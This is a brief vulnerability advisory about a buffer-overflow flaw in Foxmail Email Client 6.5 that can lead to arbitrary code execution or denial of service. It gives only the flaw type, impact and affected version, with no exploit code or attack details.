Foxmail Email Client is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Successfully exploiting this issue will allow an attacker to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Foxmail Email Client 6.5 is vulnerable; other versions may also be affected.
